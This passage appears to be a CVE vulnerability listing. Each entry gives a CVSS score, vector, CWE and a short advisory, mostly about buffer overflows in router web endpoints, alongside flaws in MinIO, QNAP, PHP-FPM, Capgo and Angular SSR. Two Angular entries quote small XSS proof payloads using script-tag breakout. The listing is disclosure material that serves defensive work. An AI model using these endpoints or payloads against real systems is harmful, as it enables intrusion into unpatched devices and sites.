|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-10-09T17:02:06.797Z |

A vulnerability has been found in Tenda W12 3.0.0.6(3948). The affected element is the function wifiMacFilterSet of the file /goform/modules of the component HTTP Request Handler. The manipulation of the argument mac leads to stack-based buffer overflow. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-11444

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-08T08:02:10.203Z |

A security vulnerability has been detected in TOTOLINK N600R up to 4.3.0cu.7866_B20220506. This impacts the function setWiFiBasicConfig of the file /cgi-bin/cstecgi.cgi of the component HTTP Request Handler. Such manipulation of the argument wepkey leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed publicly and may be used.

### CVE-2025-11338

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-06T16:02:08.398Z |

A flaw has been found in D-Link DI-7100G C1 up to 20250928. This vulnerability affects the function sub_4C0990 of the file /webchat/login.cgi of the component jhttpd. Executing manipulation of the argument openid can lead to buffer overflow. It is possible to launch the attack remotely. The exploit has been published and may be used.

### CVE-2025-11328

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-10-06T08:32:07.978Z |

A vulnerability was detected in Tenda AC18 15.03.05.19(6318). This issue affects some unknown processing of the file /goform/SetDDNSCfg. The manipulation of the argument ddnsEn results in stack-based buffer overflow. It is possible to launch the attack remotely. The exploit is now public and may be used.

### CVE-2025-11327

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-10-06T08:02:06.994Z |

A security vulnerability has been detected in Tenda AC18 15.03.05.19(6318). This vulnerability affects unknown code of the file /goform/SetUpnpCfg. The manipulation of the argument upnpEn leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed publicly and may be used.

### CVE-2025-11326

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-10-06T07:32:07.259Z |

A weakness has been identified in Tenda AC18 15.03.05.19(6318). This affects an unknown part of the file /goform/WifiMacFilterSet. Executing a manipulation of the argument wifi_chkHz can lead to stack-based buffer overflow. The attack may be performed from remote. The exploit has been made available to the public and could be used for attacks.

### CVE-2025-11120

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-09-28T21:02:06.820Z |

A weakness has been identified in Tenda AC8 16.03.34.06. The affected element is the function formSetServerConfig of the file /goform/SetServerConfig. Executing manipulation can lead to buffer overflow. It is possible to launch the attack remotely. The exploit has been made available to the public and could be exploited.

### CVE-2025-10953

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-09-25T16:02:05.628Z |

A security vulnerability has been detected in UTT 1200GW and 1250GW up to 3.0.0-170831/3.2.2-200710. This vulnerability affects unknown code of the file /goform/formApMail. The manipulation of the argument senderEmail leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-10948

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-09-25T14:02:07.376Z |

A vulnerability has been found in MikroTik RouterOS 7. This affects the function parse_json_element of the file /rest/ip/address/print of the component libjson.so. The manipulation leads to buffer overflow. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 7.20.1 and 7.21beta2 mitigates this issue. You should upgrade the affected component. The vendor replied: "Our bug tracker reports that your issue has been fixed. This means that we plan to release a RouterOS update with this fix. Make sure to upgrade to the next release when it comes out."

### CVE-2025-10942

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-09-25T11:02:08.595Z |

A vulnerability was identified in H3C Magic B3 up to 100R002. This affects the function AddMacList/EditMacList of the file /goform/aspForm. The manipulation of the argument param leads to buffer overflow. The attack can be initiated remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-10838

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-09-23T04:32:07.071Z |

A vulnerability was identified in Tenda AC21 16.03.08.16. The affected element is the function sub_45BB10 of the file /goform/WifiExtraSet. The manipulation of the argument wpapsk_crypto leads to buffer overflow. It is possible to initiate the attack remotely. The exploit is publicly available and might be used.

### CVE-2025-10666

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-09-18T13:02:06.922Z |

A security flaw has been discovered in D-Link DIR-825 up to 2.10. Affected by this vulnerability is the function sub_4106d4 of the file apply.cgi. The manipulation of the argument countdown_time results in buffer overflow. The attack can be executed remotely. The exploit has been released to the public and may be exploited. This vulnerability only affects products that are no longer supported by the maintainer.

### CVE-2025-10443

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-09-15T11:32:07.435Z |

A vulnerability was identified in Tenda AC9 and AC15 15.03.05.14/15.03.05.18. This vulnerability affects the function formexeCommand of the file /goform/exeCommand. Such manipulation of the argument cmdinput leads to buffer overflow. The attack can be executed remotely. The exploit is publicly available and might be used.

### CVE-2023-7308

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-306` |
| Published | 2025-08-27T21:26:35.196Z |

SecGate3600, a network firewall product developed by NSFOCUS, contains a sensitive information disclosure vulnerability in the /cgi-bin/authUser/authManageSet.cgi endpoint. The affected component fails to enforce authentication checks on POST requests to retrieve user data. An unauthenticated remote attacker can exploit this flaw to obtain sensitive information, including user identifiers and configuration details, by sending crafted requests to the vulnerable endpoint. An affected version range is undefined. Exploitation evidence was first observed by the Shadowserver Foundation on 2024-06-18 UTC.

### CVE-2025-7093

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-07-06T20:32:05.782Z |

A vulnerability was found in Belkin F9K1122 1.00.33. It has been declared as critical. Affected by this vulnerability is the function formSetLanguage of the file /goform/formSetLanguage of the component webs. The manipulation of the argument webpage leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-48045

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-201` |
| Published | 2025-05-29T12:29:33.475Z |

An unauthenticated HTTP GET request to the /client.php endpoint will disclose the default administrator user credentials.

### CVE-2025-4008

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-77;CWE-306` |
| Published | 2025-05-21T15:31:23.118Z |

The Meteobridge web interface let meteobridge administrator manage their weather station data collection and administer their meteobridge system through a web application written in CGI shell scripts and C.

This web interface exposes an endpoint that is vulnerable to command injection.

Remote unauthenticated attackers can gain arbitrary command execution with elevated privileges ( root ) on affected devices.

### CVE-2025-4298

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-05-05T23:31:05.551Z |

A vulnerability was found in Tenda AC1206 up to 15.03.06.23. It has been declared as critical. This vulnerability affects the function formSetCfm of the file /goform/setcfm. The manipulation leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-4007

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-04-28T07:31:05.788Z |

A vulnerability classified as critical was found in Tenda W12 and i24 3.0.0.4(2887)/3.0.0.5(3644). Affected by this vulnerability is the function cgidhcpsCfgSet of the file /goform/modules of the component httpd. The manipulation of the argument json leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-3990

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-04-27T23:00:09.085Z |

A vulnerability, which was classified as critical, has been found in TOTOLINK N150RT 3.4.0-B20190525. Affected by this issue is some unknown functionality of the file /boafrm/formVlan. The manipulation of the argument submit-url leads to buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-3988

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-04-27T22:00:07.601Z |

A vulnerability classified as critical has been found in TOTOLINK N150RT 3.4.0-B20190525. Affected is an unknown function of the file /boafrm/formPortFw. The manipulation of the argument service_type leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-3820

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-04-19T20:31:06.957Z |

A vulnerability was found in Tenda W12 and i24 3.0.0.4(2887)/3.0.0.5(3644) and classified as critical. Affected by this issue is the function cgiSysUplinkCheckSet of the file /bin/httpd. The manipulation of the argument hostIp1/hostIp2 leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-3803

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-04-19T15:00:15.751Z |

A vulnerability was found in Tenda W12 and i24 3.0.0.4(2887)/3.0.0.5(3644). It has been rated as critical. This issue affects the function cgiSysScheduleRebootSet of the file /bin/httpd. The manipulation of the argument rebootDate leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-3785

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-04-18T08:31:05.721Z |

A vulnerability has been found in D-Link DWR-M961 1.1.36 and classified as critical. This vulnerability affects unknown code of the file /boafrm/formStaticDHCP of the component Authorization Interface. The manipulation of the argument Hostname leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.49 is able to address this issue. It is recommended to upgrade the affected component.

### CVE-2025-3693

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-04-16T14:00:20.712Z |

A vulnerability was found in Tenda W12 3.0.0.5. It has been rated as critical. Affected by this issue is the function cgiWifiRadioSet of the file /bin/httpd. The manipulation leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-3538

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-04-13T18:31:05.124Z |

A vulnerability was found in D-Link DI-8100 16.07.26A1. It has been rated as critical. This issue affects the function auth_asp of the file /auth.asp of the component jhttpd. The manipulation of the argument callback leads to stack-based buffer overflow. The attack needs to be approached within the local network. The exploit has been disclosed to the public and may be used.

### CVE-2025-3346

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-04-07T09:31:08.740Z |

A vulnerability was found in Tenda AC7 15.03.06.44. It has been rated as critical. Affected by this issue is the function formSetPPTPServer of the file /goform/SetPptpServerCfg. The manipulation of the argument pptp_server_start_ip/pptp_server_end_ip leads to buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-3328

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-04-07T00:31:07.509Z |

A vulnerability was found in Tenda AC1206 15.03.06.23. It has been classified as critical. Affected is the function form_fast_setting_wifi_set of the file /goform/fast_setting_wifi_set. The manipulation of the argument ssid/timeZone leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. Other parameters might be affected as well.

### CVE-2025-31489

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-347` |
| Published | 2025-04-03T19:36:09.335Z |

MinIO is a High Performance Object Storage released under GNU Affero General Public License v3.0. The signature component of the authorization may be invalid, which would mean that as a client you can use any arbitrary secret to upload objects given the user already has prior WRITE permissions on the bucket. Prior knowledge of access-key, and bucket name this user might have access
to - and an access-key with a WRITE permissions is necessary. However with relevant information in place, uploading random objects to buckets is trivial and easy via curl. This issue is fixed in RELEASE.2025-04-03T14-56-28Z.

### CVE-2025-2081

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-547` |
| Published | 2025-03-13T17:00:03.146Z |

Optigo Networks Visual BACnet Capture Tool and Optigo Visual Networks Capture Tool version 3.1.2rc11 are vulnerable to an attacker impersonating the web application service and mislead victim clients.

### CVE-2025-1025

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-434` |
| Published | 2025-02-05T05:00:16.269Z |

Versions of the package cockpit-hq/cockpit before 2.4.1 are vulnerable to Arbitrary File Upload where an attacker can use different extension to bypass the upload filter.

### CVE-2025-0566

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-01-19T06:31:12.505Z |

A vulnerability classified as critical has been found in Tenda AC15 15.13.07.13. This affects the function formSetDevNetName of the file /goform/SetDevNetName. The manipulation of the argument mac leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

### CVE-2024-53691

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-59` |
| Published | 2024-12-06T16:34:54.018Z |

A link following vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow remote attackers who have gained user access to traverse the file system to unintended locations.

We have already fixed the vulnerability in the following versions:
QTS 5.1.8.2823 build 20240712 and later
QTS 5.2.0.2802 build 20240620 and later
QuTS hero h5.1.8.2823 build 20240712 and later
QuTS hero h5.2.0.2802 build 20240620 and later

### CVE-2024-8573

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2024-09-08T10:00:06.219Z |

A vulnerability, which was classified as critical, was found in TOTOLINK AC1200 T8 and AC1200 T10 4.1.5cu.861_B20230220/4.1.8cu.5207. This affects the function setParentalRules of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument desc/week/sTime/eTime leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. Other parameters might be affected as well. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2024-7830

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-120` |
| Published | 2024-08-15T13:00:06.188Z |

** UNSUPPORTED WHEN ASSIGNED ** A vulnerability, which was classified as critical, was found in D-Link DNS-120, DNR-202L, DNS-315L, DNS-320, DNS-320L, DNS-320LW, DNS-321, DNR-322L, DNS-323, DNS-325, DNS-326, DNS-327L, DNR-326, DNS-340L, DNS-343, DNS-345, DNS-726-4, DNS-1100-4, DNS-1200-05 and DNS-1550-04 up to 20240814. Affected is the function cgi_move_photo of the file /cgi-bin/photocenter_mgr.cgi. The manipulation of the argument photo_name leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. NOTE: This vulnerability only affects products that are no longer supported by the maintainer. NOTE: Vendor was contacted early and confirmed that the product is end-of-life. It should be retired and replaced.

### CVE-2020-15227

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-74` |
| Published | 2020-10-01T19:00:19.000Z |

Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6 are vulnerable to an code injection attack by passing specially formed parameters to URL that may possibly leading to RCE. Nette is a PHP/Composer MVC Framework.

### CVE-2019-11043

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-120` |
| Published | 2019-10-28T14:19:04.252Z |

In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.

### CVE-2026-56243

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-288` |
| Published | 2026-06-23T13:16:44.553 |

Capgo before 12.128.2 contains a security control bypass vulnerability where the PostgREST/RLS plane accepts plaintext API keys through the capgkey header despite enforce_hashed_api_keys being enabled. Attackers can bypass org-level hashed-key enforcement by sending plaintext API keys directly to the PostgREST/RLS plane to access protected resources.

### CVE-2026-56222

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639` |
| Published | 2026-06-23T13:16:44.097 |

Capgo before 12.128.2 contains an authorization bypass vulnerability in POST /private/role_bindings that fails to verify app_id ownership during app-scoped role binding creation. An attacker with administrative privileges in one organization can create role bindings targeting applications owned by other organizations, enabling unauthorized read and modification of victim applications.

### CVE-2026-10521

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-425` |
| Published | 2026-06-23T08:16:23.837 |

An high privileged remote attacker can access a hidden configuration method, that should not be accessible by any user, to modify critical program parameters. This can result in a total loss of confidentiality, integrity and availability.

### CVE-2026-50556

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-06-22T18:16:43.190 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.0-rc.2, 21.2.16, 20.3.24, and 19.2.25, a Cross-Site Scripting (XSS) vulnerability exists in @angular/platform-server's DOM emulation dependency (domino) when serializing the content of <noscript> elements. When rendering dynamic text content inside a <noscript> element via template bindings (such as {{ value }} or [textContent]), the template engine expects the browser to render the content safely. Under Server-Side Rendering (SSR), domino is configured with scripting enabled, meaning <noscript> is treated as a raw-text element. However, domino's serializer completely omitted <noscript> from the list of raw-text elements requiring closing-tag escaping during DOM serialization. As a result, any occurrence of </noscript> in the bound dynamic text was never escaped under any circumstances. The unescaped closing tag was serialized directly into the output HTML (e.g. <noscript></noscript><script>alert(1)</script></noscript>). When parsed by a browser, it closes the <noscript> block early, allowing the injected <script> block to execute in the user's browser context, causing same-origin Cross-Site Scripting (XSS). This vulnerability is fixed in 22.0.0-rc.2, 21.2.16, 20.3.24, and 19.2.25.

### CVE-2026-50555

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-06-22T18:16:43.057 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.0-rc.2, 21.2.16, 20.3.24, and 19.2.25, a Cross-Site Scripting (XSS) vulnerability exists in @angular/platform-server's DOM emulation dependency (domino) when serializing the content of raw-text elements (such as <script>, <style>, and <iframe>). domino supports escaping raw-text elements during serialization to prevent closing-tag breakout. However, a Unicode index alignment bug existed in this escaping logic. In JavaScript, string lengths and character indices are calculated based on UTF-16 code units (where astral characters—such as emojis—occupy 2 code units / 4 bytes). If the bound dynamic text contained astral Unicode characters before the closing tag (e.g. </script>, </style>, or </iframe>), the index offset calculation in domino's replacement logic shifted. This misalignment caused domino to fail to replace or escape the closing tag, leaving it raw and unescaped in the output HTML. An attacker who controls the dynamic text can supply a payload containing both an astral Unicode character and a closing tag (e.g., 😀</iframe><script>alert(1)</script>). When serialized on the server during SSR, the browser parses the unescaped closing tag, exits the raw-text context early, and executes the subsequent <script> block, leading to same-origin Cross-Site Scripting (XSS). This vulnerability is fixed in 22.0.0-rc.2, 21.2.16, 20.3.24, and 19.2.25.

### CVE-2026-54267

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79;CWE-471` |
| Published | 2026-06-22T16:16:39.457 |

Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 22.0.1, 21.2.17, and 20.3.25, to optimize client-side bootstrap in Server-Side Rendered (SSR) environments, Angular supports Hydration via provideClientHydration(). During SSR, Angular serializes the application's runtime state (such as cached HttpClient responses) and outputs it into the HTML stream as a <script> tag with a predictable identifier. During client bootstrap, Angular recovers this state by looking up the element via document.getElementById('ng-state') and parsing its text content. Because the DOM element lookup for the state container is predictable and relies solely on the ID selector (ng-state), it is susceptible to DOM Clobbering. If the application binds untrusted user input or CMS content to element properties such as id (e.g., <div [id]="userInput"> or <a id="ng-state">) before the genuine <script> tag is parsed by the browser, the attacker-controlled element takes precedence in the DOM lookup. During hydration, when Angular calls document.getElementById('ng-state'), the browser returns the attacker's clobbered element. Angular then attempts to parse the text content or attributes of this clobbered element as JSON. This vulnerability is fixed in 22.0.1, 21.2.17, and 20.3.25.

### CVE-2026-1603

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Weaknesses | `CWE-288` |
| Published | 2026-02-10T15:09:35.459Z |

An authentication bypass in Ivanti Endpoint Manager before version 2024 SU5 allows a remote unauthenticated attacker to leak specific stored credential data.

### CVE-2025-12235

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T06:22:44.013Z |

A vulnerability was found in Tenda CH22 1.0.0.1. This vulnerability affects the function fromSetIpBind of the file /goform/SetIpBind. The manipulation of the argument page results in buffer overflow. The attack must originate from the local network. The exploit has been made public and could be used.

### CVE-2025-2725

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-03-25T02:00:09.925Z |

